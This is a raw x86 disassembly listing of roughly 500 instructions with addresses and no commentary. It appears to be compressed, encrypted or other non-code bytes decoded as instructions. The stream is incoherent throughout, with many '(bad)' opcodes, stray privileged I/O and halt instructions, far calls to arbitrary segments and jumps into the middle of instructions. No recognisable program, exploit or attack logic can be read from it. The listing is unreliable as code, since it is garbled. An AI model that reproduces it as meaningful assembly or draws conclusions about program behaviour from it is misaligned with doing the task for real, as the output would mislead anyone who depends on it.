  4234df:	sar    DWORD PTR [edx+ecx*4-0x2d],1
  4234e3:	inc    eax
  4234e4:	push   edx
  4234e5:	mov    ds:0x74b3e478,al
  4234ea:	and    al,0xeb
  4234ec:	test   BYTE PTR [ebx+ebx*2+0x47],cl
  4234f0:	lock inc esi
  4234f2:	call   0xdcaf1811
  4234f7:	adc    eax,0x43caf565
  4234fc:	mov    ecx,0x12964cfa
  423501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423502:	and    ecx,DWORD PTR [edx-0x59f29775]
  423508:	call   0xaad1:0xe3120f39
  42350f:	xlat   BYTE PTR ds:[ebx]
  423510:	sub    BYTE PTR fs:[ecx-0x1e],bl
  423514:	or     bh,BYTE PTR [eax+0x4a]
  423517:	nop
  423518:	lahf   
  423519:	and    BYTE PTR [ecx+esi*2-0x7e],ah
  42351d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42351e:	data16 xor al,0xb9
  423522:	fistp  QWORD PTR [edx-0x45]
  423525:	test   BYTE PTR [esi],bh
  423527:	pop    ebp
  423528:	scas   al,BYTE PTR es:[edi]
  423529:	pop    ebx
  42352a:	add    al,0x3a
  42352c:	add    esi,DWORD PTR [esi-0xa]
  42352f:	dec    ecx
  423530:	mov    al,ds:0x3f7e036e
  423535:	(bad)  
  423536:	clc    
  423537:	push   edi
  423538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423539:	cdq    
  42353a:	sbb    BYTE PTR gs:0x43297f71,0x7e
  423542:	not    DWORD PTR [ebx+0x198f27c7]
  423548:	mov    edi,0xbcc4bf97
  42354d:	ficomp WORD PTR [edx+0x49]
  423550:	icebp  
  423551:	arpl   WORD PTR [eax+0x75],sp
  423554:	outs   dx,DWORD PTR ds:[esi]
  423555:	(bad)  
  423556:	inc    eax
  423557:	imul   edi,DWORD PTR [edi],0x104931fe
  42355d:	jmp    0x42350c
  42355f:	stos   BYTE PTR es:[edi],al
  423560:	pop    es
  423561:	mov    ch,BYTE PTR ds:0x23988c6c
  423567:	out    0xa,al
  423569:	push   es
  42356a:	mov    bl,0x29
  42356c:	bound  ecx,QWORD PTR [esi-0x642d87bc]
  423572:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423573:	jno    0x423574
  423575:	mov    esi,0x2a7d4036
  42357a:	mov    al,ds:0xa51aa0dc
  42357f:	and    eax,0x87e24154
  423584:	in     eax,0x25
  423586:	nop
  423587:	or     BYTE PTR [edx],ah
  423589:	adc    esp,DWORD PTR [ebx+0x334efda5]
  42358f:	and    eax,0x7336b01a
  423594:	cmp    edi,DWORD PTR [edi+0x5948ae8f]
  42359a:	sahf   
  42359b:	stc    
  42359c:	rcl    BYTE PTR [ebx+0x3ac0ce19],0x9a
  4235a3:	sti    
  4235a4:	sbb    BYTE PTR [eax],ch
  4235a6:	test   eax,0x6390c756
  4235ab:	nop
  4235ac:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235ae:	rol    DWORD PTR [eax-0x26],cl
  4235b1:	ficomp DWORD PTR [edi]
  4235b3:	lods   al,BYTE PTR ds:[esi]
  4235b4:	fadd   DWORD PTR [eax-0x43f695cd]
  4235ba:	outs   dx,BYTE PTR ds:[esi]
  4235bb:	sti    
  4235bc:	fsub   DWORD PTR ds:[ecx]
  4235bf:	enter  0xb9c7,0x3d
  4235c3:	or     al,0x3e
  4235c5:	call   FWORD PTR [ebp+0x73]
  4235c8:	mov    BYTE PTR [edi],dl
  4235ca:	sti    
  4235cb:	mov    eax,ds:0x45801acc
  4235d0:	push   ebp
  4235d1:	into   
  4235d2:	cld    
  4235d3:	(bad)  
  4235d4:	push   ebx
  4235d5:	addr16 and al,0x86
  4235d8:	jb     0x42361a
  4235da:	mov    ebp,0x4bf00ef0
  4235df:	fs sbb ebp,ebx
  4235e2:	es ja  0x4235b6
  4235e5:	call   DWORD PTR [eax]
  4235e7:	fmul   st(6),st
  4235e9:	call   0xf8d621f6
  4235ee:	cli    
  4235ef:	fist   WORD PTR [esi]
  4235f1:	inc    esi
  4235f2:	cdq    
  4235f3:	add    ah,BYTE PTR [esi+0x259d4a2e]
  4235f9:	aas    
  4235fa:	or     dl,bl
  4235fc:	adc    eax,0x1f74aa23
  423601:	fs icebp 
  423603:	ret    0x767a
  423606:	icebp  
  423607:	jbe    0x4235a0
  423609:	out    0x33,al
  42360b:	jno    0x423616
  42360d:	in     al,dx
  42360e:	fstp   QWORD PTR [ecx-0x3753608b]
  423614:	ins    BYTE PTR es:[edi],dx
  423615:	mov    bl,0x75
  423617:	cld    
  423618:	sub    BYTE PTR [esi],ch
  42361a:	dec    ebp
  42361b:	mov    ah,0x94
  42361d:	add    BYTE PTR [esi],0x45
  423620:	cld    
  423621:	dec    ebp
  423622:	fiadd  WORD PTR fs:[edi-0x65]
  423626:	out    0x66,eax
  423628:	sbb    bl,BYTE PTR [edi+esi*2]
  42362b:	adc    eax,0x6dccb75d
  423630:	inc    edx
  423631:	test   al,0x15
  423633:	mov    dh,0xbc
  423635:	jo     0x4235be
  423637:	pop    es
  423638:	inc    edx
  423639:	mov    eax,0x6049e4de
  42363e:	pop    esp
  42363f:	push   0x926184e9
  423644:	or     eax,0xc4ac4a72
  423649:	inc    edx
  42364a:	into   
  42364b:	xor    DWORD PTR [esi-0x5a],ebx
  42364e:	outs   dx,DWORD PTR ds:[esi]
  42364f:	pop    ss
  423650:	xchg   ebx,eax
  423651:	fdiv   QWORD PTR [ebp+0xec01acf]
  423657:	ins    BYTE PTR es:[edi],dx
  423658:	arpl   WORD PTR [edi-0x78],sp
  42365b:	dec    esp
  42365c:	neg    BYTE PTR [esp+ecx*1-0x39300c20]
  423663:	mov    ah,0x72
  423665:	adc    BYTE PTR [ebx+0x591dcffd],cl
  42366b:	mov    edx,0x2992c6bc
  423670:	cmp    eax,0xd14f52ea
  423675:	jns    0x4236ab
  423677:	rol    BYTE PTR fs:[esi+0x4f49c934],1
  42367e:	fsubr  DWORD PTR ds:0x2e
  423684:	add    BYTE PTR [eax],al
  423686:	add    BYTE PTR [eax],al
  423688:	add    BYTE PTR [eax],al
  42368a:	pop    eax
  42368b:	pop    ecx
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0xcaa42923
  423697:	xlat   BYTE PTR ds:[ebx]
  423698:	nop
  423699:	or     ebp,eax
  42369b:	les    eax,FWORD PTR [ecx]
  42369d:	add    BYTE PTR [edi+0x6],bh
  4236a0:	add    BYTE PTR [eax],al
  4236a2:	sbb    eax,0x552b17b9
  4236a7:	sbb    BYTE PTR ds:0x57652768,ah
  4236ad:	jecxz  0x4236ca
  4236af:	dec    ecx
  4236b0:	mov    ds:0xbb3dce9f,eax
  4236b5:	or     eax,0xdae86c82
  4236ba:	mov    ecx,0x265edccb
  4236bf:	std    
  4236c0:	sbb    BYTE PTR [edi-0x6f942753],0x8b
  4236c7:	mov    cl,0x2b
  4236c9:	mov    al,0x3d
  4236cb:	stos   DWORD PTR es:[edi],eax
  4236cc:	mov    BYTE PTR [edi-0x15865cac],ah
  4236d2:	mov    al,0x4a
  4236d4:	fcom   DWORD PTR [ebp-0x46]
  4236d7:	dec    ebx
  4236d8:	mov    ds:0x6b0989c5,eax
  4236dd:	mov    ebx,0x9070e21b
  4236e2:	pop    es
  4236e3:	dec    eax
  4236e4:	xor    ecx,DWORD PTR [esi+0x32b41851]
  4236ea:	enter  0x3056,0xce
  4236ee:	popa   
  4236ef:	lods   al,BYTE PTR ds:[esi]
  4236f0:	shl    BYTE PTR [edi+0x16],0x20
  4236f4:	loopne 0x42369c
  4236f6:	(bad)  
  4236f7:	cld    
  4236f8:	add    BYTE PTR [ebx-0x3d],cl
  4236fb:	pop    ecx
  4236fc:	test   BYTE PTR [edi+edi*1-0x8],dh
  423700:	loope  0x4236ac
  423702:	mov    al,ds:0x537f5ff1
  423707:	mov    esi,0xf083d628
  42370c:	jbe    0x423697
  42370e:	fldenv [edi-0x24]
  423711:	mov    ch,0xf1
  423713:	jno    0x4236d2
  423715:	lahf   
  423716:	sub    eax,0xc04c6d1
  42371b:	adc    BYTE PTR [edx],bl
  42371d:	into   
  42371e:	ja     0x4236d0
  423720:	enter  0xa29c,0x49
  423724:	iret   
  423725:	ret    
  423726:	lahf   
  423727:	out    0xa2,eax
  423729:	jb     0x4236f6
  42372b:	(bad)  
  42372c:	cld    
  42372d:	jbe    0x423794
  42372f:	mov    edi,DWORD PTR [edi]
  423731:	xchg   edi,eax
  423732:	call   0xd7b1:0xe02d6af2
  423739:	xchg   ebx,eax
  42373a:	imul   edi,DWORD PTR [ecx],0x48
  42373d:	loopne 0x423729
  42373f:	adc    bh,ah
  423741:	arpl   si,sp
  423743:	fucomi st,st(2)
  423745:	mov    ds:0xf8b7ad35,eax
  42374a:	jecxz  0x42372b
  42374c:	jge    0x4236f6
  42374e:	mov    ds:0x20f0ce06,eax
  423753:	adc    bl,BYTE PTR [edx-0x61]
  423756:	mov    ds:0xad151161,eax
  42375b:	sub    al,0x2e
  42375d:	pop    ecx
  42375e:	bound  ecx,QWORD PTR [ebx]
  423760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423761:	arpl   WORD PTR [edi+esi*4-0x432066e0],bx
  423768:	into   
  423769:	mov    ecx,0xd32ad0ab
  42376e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42376f:	test   al,0x17
  423771:	inc    BYTE PTR [eax-0x3d]
  423774:	jnp    0x4237ac
  423776:	cmp    BYTE PTR [edx+edi*1-0x6b05c77b],bl
  42377d:	adc    eax,0x99ba955
  423782:	cmp    bl,BYTE PTR [edx-0x66]
  423785:	mov    ah,0x76
  423787:	(bad)  
  423788:	neg    BYTE PTR [ebx]
  42378a:	jns    0x4237e6
  42378c:	mov    ebp,0x42791396
  423791:	bound  ebp,QWORD PTR [ebx-0x7aeaed7c]
  423797:	sar    DWORD PTR [edx-0x34fd0a78],1
  42379d:	push   ebp
  42379e:	call   0x81e6:0x4eb6f00a
  4237a5:	call   0x31efc07
  4237aa:	sbb    eax,DWORD PTR [esi-0x3018125]
  4237b0:	rcl    DWORD PTR [edx+ebp*8-0x7750aaee],0xdf
  4237b8:	mov    dh,0x97
  4237ba:	inc    eax
  4237bb:	scas   al,BYTE PTR es:[edi]
  4237bc:	inc    eax
  4237bd:	mov    ch,BYTE PTR [edx-0x6a]
  4237c0:	retf   
  4237c1:	out    0x85,al
  4237c3:	int3   
  4237c4:	dec    eax
  4237c5:	les    edx,FWORD PTR [ebp-0x19]
  4237c8:	mov    bl,0x2
  4237ca:	fist   WORD PTR [ebp-0x1d]
  4237cd:	xor    edi,esi
  4237cf:	sbb    BYTE PTR [eax+edi*1],bl
  4237d2:	inc    esp
  4237d3:	add    bl,BYTE PTR [ecx-0x9]
  4237d6:	mov    ebx,0x3d44b979
  4237db:	sbb    BYTE PTR [edx-0x4],bl
  4237de:	jmp    0x423807
  4237e0:	ins    DWORD PTR es:[edi],dx
  4237e1:	test   al,0x19
  4237e3:	lods   eax,DWORD PTR ds:[esi]
  4237e4:	or     BYTE PTR [ebp-0x34],0x1f
  4237e8:	or     ebx,DWORD PTR ds:0xc27b604e
  4237ee:	fwait
  4237ef:	push   ebp
  4237f0:	xchg   ebp,eax
  4237f1:	(bad)  
  4237f2:	lods   al,BYTE PTR ds:[esi]
  4237f3:	cmp    bl,BYTE PTR [eax+0x43]
  4237f6:	ret    0xeee4
  4237f9:	out    dx,eax
  4237fa:	repnz sub al,0xdc
  4237fd:	je     0x423810
  4237ff:	shr    DWORD PTR [ecx+0x31f0be1f],0x59
  423806:	retf   0xc87c
  423809:	aam    0xd0
  42380b:	out    dx,eax
  42380c:	sbb    al,0x10
  42380e:	adc    edx,esp
  423810:	fstp   TBYTE PTR [ecx]
  423812:	push   ebp
  423813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423814:	pop    esp
  423815:	and    eax,ebp
  423817:	popa   
  423818:	mov    esp,0x1f9840f
  42381d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42381e:	jne    0x42389f
  423820:	sti    
  423821:	lock and DWORD PTR [esi-0x6bca4aef],esi
  423828:	(bad)  
  42382a:	adc    DWORD PTR [ecx+0x59826e1e],0xffffffea
  423831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423832:	adc    ecx,edi
  423834:	nop
  423835:	sub    al,0xac
  423837:	imul   esi,DWORD PTR [ebx-0x75080699],0xffffff81
  42383e:	call   0x5075:0x2b188b8d
  423845:	call   0xfe16:0x8208ee02
  42384c:	test   BYTE PTR [ebp-0x34],0x26
  423850:	push   cs
  423851:	mov    ss,WORD PTR [ebx+0x5b]
  423854:	dec    ebx
  423855:	cs stos BYTE PTR es:[edi],al
  423857:	jle    0x4237e6
  423859:	mov    al,ds:0x94bf604d
  42385e:	(bad)  
  42385f:	std    
  423860:	(bad)  
  423861:	push   ecx
  423862:	sub    DWORD PTR [edx-0x1fe93d1a],edi
  423868:	outs   dx,DWORD PTR ds:[esi]
  423869:	and    DWORD PTR [ebp+0x789f2e6a],0x45
  423870:	fisubr WORD PTR [esi-0x131f04d4]
  423876:	lahf   
  423877:	es pushf 
  423879:	cmp    ebp,esp
  42387b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42387c:	rcl    DWORD PTR [ecx],1
  42387e:	idiv   BYTE PTR [esi]
  423880:	push   0xffffffa9
  423882:	pop    ebx
  423883:	mov    ebx,0xb73eb113
  423888:	mov    ch,0xc8
  42388a:	mov    edi,0x9d0cf821
  42388f:	add    al,0x53
  423891:	push   edx
  423892:	mov    esp,0xefb42679
  423897:	ins    DWORD PTR es:[edi],dx
  423898:	(bad)  
  423899:	fbld   TBYTE PTR [edi]
  42389b:	cmc    
  42389c:	mov    esp,0x37461e18
  4238a1:	xchg   esp,eax
  4238a2:	xor    esi,DWORD PTR [eax]
  4238a4:	dec    edx
  4238a5:	icebp  
  4238a6:	sbb    bl,bl
  4238a8:	icebp  
  4238a9:	inc    eax
  4238aa:	adc    edx,DWORD PTR [edx]
  4238ac:	adc    BYTE PTR [edi],ah
  4238ae:	int    0xfd
  4238b0:	sub    al,0xfc
  4238b2:	jmp    DWORD PTR [edi+0x601064bf]
  4238b8:	inc    edx
  4238b9:	retf   0x3cee
  4238bc:	loope  0x4238fa
  4238be:	adc    edi,DWORD PTR [esi-0x1d]
  4238c1:	push   edi
  4238c2:	out    0xb4,eax
  4238c4:	pusha  
  4238c5:	sahf   
  4238c6:	(bad)  
  4238c7:	and    eax,0xfc363f7a
  4238cc:	icebp  
  4238cd:	and    BYTE PTR [esi+esi*1-0x51],al
  4238d1:	dec    esi
  4238d2:	add    bl,BYTE PTR [ecx+ebx*2+0x727b4034]
  4238d9:	cmp    ecx,esp
  4238db:	fstp   DWORD PTR [edi-0x35c5a90e]
  4238e1:	xor    BYTE PTR [edx-0x8c0eab6],cl
  4238e7:	dec    ebx
  4238e8:	xor    ah,BYTE PTR [esi+0x2a69dffb]
  4238ee:	imul   esp,DWORD PTR [eax],0x60398a95
  4238f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238f5:	outs   dx,DWORD PTR ds:[esi]
  4238f6:	loope  0x423906
  4238f8:	adc    DWORD PTR [ebx+0x7a],0x70
  4238fc:	jmp    0xf84119d0
  423901:	sub    DWORD PTR [ebx],esi
  423903:	pop    es
  423904:	dec    edi
  423905:	jno    0x42388e
  423907:	dec    ebp
  423908:	retf   0x816
  42390b:	mov    edx,0x6e6c0f71
  423910:	add    ah,cl
  423912:	mov    ds:0x6e488cc3,al
  423917:	xor    dh,ah
  423919:	ret    
  42391a:	fs ins BYTE PTR es:[edi],dx
  42391c:	clc    
  42391d:	sbb    cl,dh
  42391f:	dec    ebx
  423920:	cmp    ah,al
  423922:	mov    ch,0x17
  423924:	aam    0x90
  423926:	and    bh,dh
  423928:	mov    ds:0xaeba1891,eax
  42392d:	iret   
  42392e:	inc    edi
  42392f:	imul   eax,DWORD PTR ds:0xa51b0f50,0x58
  423936:	arpl   WORD PTR [esi-0x70],sp
  423939:	dec    ecx
  42393a:	rcl    BYTE PTR [edi+0x2f03ed15],1
  423940:	rcr    DWORD PTR [edi+0x4a],cl
  423943:	aaa    
  423944:	call   0x39f165a5
  423949:	call   0xfeb0b23a
  42394e:	jmp    0x4239b8
  423950:	cmp    DWORD PTR [edi+0x58a50e6e],0x57
  423957:	jmp    0x2254:0xd3d92a36
  42395e:	lock or eax,0x3905df5c
  423964:	clc    
  423965:	pop    esi
  423966:	jge    0x423966
  423968:	cmp    ch,dl
  42396a:	and    DWORD PTR [edx-0x49],eax
  42396d:	scas   al,BYTE PTR es:[edi]
  42396e:	push   ebx
  42396f:	into   
  423970:	iret   
  423971:	mov    WORD PTR [ebp-0x88dd1a9],cs
  423977:	sub    BYTE PTR [eax-0x4c],bl
  42397a:	push   ebp
  42397b:	std    
  42397c:	cmp    ebp,DWORD PTR [esi+0x9721f53]
  423982:	(bad)  
  423983:	jmp    0x423917
  423985:	into   
  423986:	lods   eax,DWORD PTR ds:[esi]
  423987:	mov    edx,DWORD PTR [ebp-0x9]
  42398a:	pop    eax
  42398b:	adc    bl,BYTE PTR [ebp+ebx*1-0x62]
  42398f:	mov    ebp,0xb94161b6
  423994:	push   esp
  423995:	jb     0x423a12
  423997:	cmp    ebx,esp
  423999:	and    al,0x37
  42399b:	sub    ah,BYTE PTR [eax]
  42399d:	test   dl,bh
  42399f:	fs and eax,0x453866d8
  4239a5:	repnz out dx,al
  4239a7:	(bad)  
  4239a8:	hlt    
  4239a9:	cli    
  4239aa:	rcl    DWORD PTR ds:0x45c8d324,1
  4239b0:	sbb    al,0xa6
  4239b2:	fs inc esp
  4239b4:	aad    0xa2
  4239b6:	popf   
  4239b7:	dec    edi
  4239b8:	push   esp
  4239b9:	mov    ebx,0xdbd39451
  4239be:	ffreep st(6)
  4239c0:	and    ecx,eax
  4239c2:	(bad)  
  4239c3:	push   es
  4239c4:	mov    cl,0x77
  4239c6:	pop    ebx
  4239c7:	and    DWORD PTR [edx-0xf5de736],eax
  4239cd:	push   ecx
  4239ce:	scas   eax,DWORD PTR es:[edi]
  4239cf:	push   esi
  4239d0:	call   0x2296:0x1f10a015
  4239d7:	ja     0x4239dd
  4239d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239da:	push   cs
  4239db:	inc    ecx
  4239dc:	arpl   WORD PTR [edx+0x1be3c4c0],cx
  4239e2:	sbb    edx,0xe8be9680
  4239e8:	and    ecx,edx
  4239ea:	fwait
  4239eb:	push   ds
  4239ec:	lds    edi,FWORD PTR [eax]
  4239ee:	mov    ds,WORD PTR [edx]
  4239f0:	test   eax,0x4973394c
  4239f5:	cld    
  4239f6:	and    al,0xe
  4239f8:	cmp    edi,0xffffffc7
  4239fb:	or     eax,0xc714b68c
  423a00:	aam    0x93
  423a02:	aad    0x3
  423a04:	mov    edx,0xfdcd1c2d
  423a09:	jb     0x423a0d
  423a0b:	jae    0x423a52
  423a0d:	in     al,dx
  423a0e:	mov    al,BYTE PTR [ecx+ecx*2+0x23]
  423a12:	or     DWORD PTR [ecx],edx
  423a14:	adc    al,0x35
  423a16:	jno    0x423a53
  423a18:	sub    DWORD PTR ds:0x31b071bc,esp
  423a1e:	inc    ebp
  423a1f:	mov    dl,0xca
  423a21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a22:	sbb    esp,ecx
  423a24:	cmp    BYTE PTR [edx],dl
  423a26:	xchg   esp,eax
  423a27:	idiv   esp
  423a29:	outs   dx,BYTE PTR ds:[esi]
  423a2a:	lea    ecx,[ebx-0x194c168c]
  423a30:	scas   eax,DWORD PTR es:[edi]
  423a31:	jne    0x4239ce
  423a33:	inc    eax
  423a34:	sub    bl,dl
  423a36:	pusha  
  423a37:	(bad)  
  423a38:	and    al,0x9d
  423a3a:	inc    ebx
  423a3b:	js     0x423a52
  423a3d:	cmp    esi,ebx
  423a3f:	test   eax,0x41764690
  423a44:	in     eax,0xc4
  423a46:	dec    esp
  423a47:	jp     0x423abb
  423a49:	cmc    
  423a4a:	imul   ecx,ebx,0xa8f452a0
  423a50:	arpl   WORD PTR [ecx],sp
  423a52:	lock xor dh,ah
  423a55:	mov    ds:0xfa7c7c54,al
  423a5a:	jg     0x423acb
  423a5c:	lock mov cl,0xeb
  423a5f:	sub    al,0x9
  423a61:	in     al,0x72
  423a63:	dec    ebp
  423a64:	pop    esi
  423a65:	lods   al,BYTE PTR ds:[esi]
  423a66:	arpl   WORD PTR [ecx+ebp*2],bx
  423a69:	shr    edx,0x8b
  423a6c:	mov    bh,0x83
  423a6e:	mov    bl,0xbc
  423a70:	call   FWORD PTR [edi]
  423a72:	add    BYTE PTR [esi+0xd],0x2c
  423a76:	scas   eax,DWORD PTR es:[edi]
  423a77:	cli    
  423a78:	hlt    
  423a79:	pop    esi
  423a7a:	not    DWORD PTR [eax+0x63]
  423a7d:	push   esi
  423a7e:	mov    ebp,DWORD PTR [eax+eiz*4]
  423a81:	pusha  
  423a82:	or     BYTE PTR [edx-0x39],0xec
  423a86:	ja     0x423aa2
  423a88:	jns    0x423ad7
  423a8a:	repz jns 0x423a14
  423a8d:	(bad)  
  423a8e:	adc    ebx,DWORD PTR [edi+0x62]
  423a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a92:	xor    eax,0xaca6b8cf
  423a97:	dec    BYTE PTR [ebx]
  423a99:	xor    al,0x4c
  423a9b:	cmp    edx,DWORD PTR [ebx+edx*1-0x62]
  423a9f:	and    dl,BYTE PTR [eax+edx*8+0x36]
  423aa3:	ficomp WORD PTR [ebx+0x171917b0]
  423aa9:	imul   ebx,DWORD PTR [esp+esi*1],0x7ef637cb
  423ab0:	mov    bh,0x29
  423ab3:	xchg   ebp,edi
  423ab5:	aaa    
  423ab6:	stos   BYTE PTR es:[edi],al
  423ab7:	push   es
  423ab8:	fnstcw WORD PTR [ecx]
  423aba:	fwait
  423abb:	jb     0x423b1b
  423abd:	jb     0x423abe
  423abf:	ins    BYTE PTR es:[edi],dx
  423ac0:	lds    ecx,FWORD PTR [eax+0x45ff83d8]
  423ac6:	xchg   ebx,eax
  423ac7:	xor    DWORD PTR [ecx],0x8d8b9d20
  423acd:	cmp    ebp,esp
  423acf:	fstp   DWORD PTR [ebp-0x213a4b96]
  423ad5:	cmp    eax,0xb63a3b5f
  423ada:	mov    al,0xd
  423adc:	in     al,0x95
  423ade:	mov    al,ds:0xeeba5a85
  423ae3:	outs   dx,DWORD PTR ds:[esi]
  423ae4:	mov    esi,0xf92d713
  423ae9:	and    ebp,DWORD PTR [ebx]
  423aeb:	push   es
  423aec:	in     eax,0xe3
  423aee:	repz stc 
  423af0:	xor    DWORD PTR [eax-0x34222396],eax
  423af6:	pop    ecx
  423af7:	push   0xf506b147
  423afc:	jg     0x423b04
  423afe:	lds    edi,FWORD PTR [ebp-0x6f]
  423b01:	mov    ecx,0x1f5efad3
  423b06:	jmp    0x1a3b:0xa19b9096
  423b0d:	sub    dh,dh
  423b0f:	push   cs
  423b10:	into   
  423b11:	fisttp QWORD PTR ds:0x6779c4ea
  423b17:	mov    bh,0xe1
  423b19:	in     al,0x3f
  423b1b:	ins    DWORD PTR es:[edi],dx
  423b1c:	jbe    0x423b62
  423b1e:	adc    BYTE PTR [ecx+eax*4],0x18
  423b22:	xchg   esi,eax
  423b23:	xor    al,BYTE PTR [ebx-0x180a14c6]
  423b29:	out    dx,al
  423b2a:	jo     0x423afc
  423b2c:	in     al,0x6f
  423b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b2f:	sbb    ebx,esp
  423b31:	sbb    DWORD PTR [edx-0x8b41a3],0xffffff9b
  423b38:	aas    
  423b39:	cwde   
  423b3a:	enter  0x3b9,0x78
  423b3e:	and    al,0x42
  423b40:	aaa    
  423b41:	repnz fcmovb st,st(1)
  423b44:	loop   0x423bb3
  423b46:	fadd   QWORD PTR [ebx-0x59100933]
  423b4c:	test   al,0x8c
  423b4e:	rcr    ah,1
  423b50:	imul   edx,edi,0x4e
  423b53:	int    0x5d
  423b55:	cli    
  423b56:	push   eax
  423b57:	lock fsubr DWORD PTR [edx-0x3ce250dd]
  423b5e:	mov    al,ds:0xfbd47b23
  423b63:	ret    
  423b64:	xchg   DWORD PTR [eax-0x5203463e],eax
  423b6a:	dec    esp
  423b6b:	pop    ecx
  423b6c:	(bad)  
  423b6d:	int    0x2e
  423b6f:	aaa    
  423b70:	inc    ebp
  423b71:	dec    esi
  423b72:	push   edi
  423b73:	fdivrp st(1),st
  423b75:	iret   
  423b76:	clc    
  423b77:	rcl    DWORD PTR [edx-0x44f74483],cl
  423b7d:	in     eax,dx
  423b7e:	dec    edi
  423b7f:	std    
  423b80:	push   0x38
  423b82:	and    DWORD PTR [ebp+ebx*8-0x43],edi
  423b86:	(bad)  
  423b87:	cmp    eax,0x31fd62dc
  423b8c:	pop    eax
  423b8d:	(bad)  
  423b8e:	pop    edi
  423b8f:	jno    0x423bb7
  423b91:	sub    BYTE PTR [esp+edx*2+0x76],dl
  423b95:	enter  0x41ad,0x8c
  423b99:	bound  esp,QWORD PTR ds:0x339ad02
  423b9f:	inc    esi
  423ba0:	ret    0x599b
  423ba3:	push   ebx
  423ba4:	fst    DWORD PTR [eax]
  423ba6:	sub    BYTE PTR [edx+0x3b55a349],0xb8
  423bad:	out    dx,eax
  423bae:	stc    
  423baf:	jo     0x423bc5
  423bb1:	or     DWORD PTR [edx],ebp
  423bb3:	push   esi
  423bb4:	xor    bp,WORD PTR [bp-0x765c]
  423bba:	sahf   
  423bbb:	pop    ss
  423bbc:	fwait
  423bbd:	and    al,0x9c
  423bbf:	xchg   esi,eax
  423bc0:	daa    
  423bc1:	fmul   QWORD PTR ds:0x63b9db0c
  423bc7:	enter  0xc3f1,0x56
  423bcb:	mov    dh,ah
  423bcd:	mov    DWORD PTR [eax],esi
  423bcf:	aas    
  423bd0:	pop    ebx
  423bd1:	add    eax,0xee249d12
  423bd6:	or     ah,al
  423bd8:	sbb    al,0xd9
  423bda:	inc    eax
  423bdb:	adc    DWORD PTR ds:[eax],0x7653fa9f
  423be2:	mov    esi,0xdcd8f54f
  423be7:	sub    DWORD PTR [eax+0x37],esi
  423bea:	aad    0x7f
  423bec:	add    eax,0x23f3ccea
  423bf1:	int3   
  423bf2:	mov    dl,0x4d
  423bf4:	scas   eax,DWORD PTR es:[edi]
  423bf5:	and    ah,BYTE PTR [edx]
  423bf7:	inc    edx
  423bf8:	arpl   bx,bp
  423bfa:	idiv   BYTE PTR [eax]
  423bfc:	mov    ebx,0x7416cdd8
  423c01:	mov    dl,0x3b
  423c03:	out    0xce,al
  423c05:	test   eax,0xe5d4d769
  423c0a:	push   edx
  423c0b:	ds jle 0x423c76
  423c0e:	fwait
  423c0f:	dec    edi
  423c10:	mov    esp,0xf754726b
  423c15:	dec    esp
  423c16:	jno    0x423c67
  423c18:	mov    esp,ebp
  423c1a:	xchg   esi,eax
  423c1b:	add    al,0x97
  423c1d:	mov    BYTE PTR ds:0xaf45aae,0x92
  423c24:	retf   
  423c25:	(bad)  
  423c26:	mov    esp,0x8028d8f8
  423c2b:	dec    eax
  423c2c:	call   0x4d8968f3
  423c31:	in     al,0xb4
  423c33:	(bad)  
  423c34:	cwde   
  423c35:	sbb    eax,0xa576e364
  423c3a:	mov    cl,0x2a
  423c3c:	popa   
  423c3d:	sub    edi,edx
  423c3f:	(bad)  
  423c40:	stos   DWORD PTR es:[edi],eax
  423c41:	pop    ss
  423c42:	push   esi
  423c43:	mov    cl,0x26
  423c45:	iret   
  423c46:	dec    ecx
  423c47:	test   al,0xc1
  423c49:	inc    ebx
  423c4a:	cmp    bh,BYTE PTR ds:0x61951b11
  423c50:	arpl   dx,bx
  423c52:	jbe    0x423c2c
  423c54:	inc    esi
  423c55:	lea    edx,[eax-0x14]
  423c58:	sub    DWORD PTR [esi+0x14],ebp
  423c5b:	xchg   BYTE PTR [ebp-0x7c606806],dl
  423c61:	(bad)  
  423c63:	icebp  
  423c64:	cmp    al,0x66
  423c66:	dec    ebp
  423c67:	ins    BYTE PTR es:[edi],dx
  423c68:	test   DWORD PTR [ecx+0x6ec2b9ec],ebx
  423c6e:	icebp  
  423c6f:	nop
  423c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c71:	popa   
  423c72:	xchg   DWORD PTR [edx-0x27],ebp
  423c75:	and    esp,DWORD PTR [ebx+ebx*1+0x5b]
  423c79:	jno    0x423c8d
  423c7b:	out    dx,eax
  423c7c:	inc    esi
  423c7d:	cmp    dl,bl
  423c7f:	mov    edi,fs
  423c81:	sub    DWORD PTR [eax+0x224260b4],edi
  423c87:	imul   ecx,DWORD PTR [ecx+0x39a43f5c],0x1f
  423c8e:	scas   eax,DWORD PTR es:[edi]
  423c8f:	mov    esp,ebp
  423c91:	shl    BYTE PTR [edx+eiz*2+0x79f338fc],cl
  423c98:	dec    esp
  423c99:	adc    DWORD PTR [edx+0x447d4d95],ebp
  423c9f:	sub    ebx,DWORD PTR [eax]
  423ca1:	fbld   TBYTE PTR [ebx]
  423ca3:	cmp    bl,BYTE PTR [esi+0x3a]
  423ca6:	das    
  423ca7:	mov    al,ds:0x9191b7c7
  423cac:	into   
  423cad:	xchg   esi,eax
  423cae:	int    0xe2
  423cb0:	dec    ebx
  423cb1:	xor    eax,0x89b9cbde
  423cb6:	icebp  
  423cb7:	in     eax,dx
  423cb8:	call   0xc375:0x5ac94b9b
  423cbf:	pop    edi
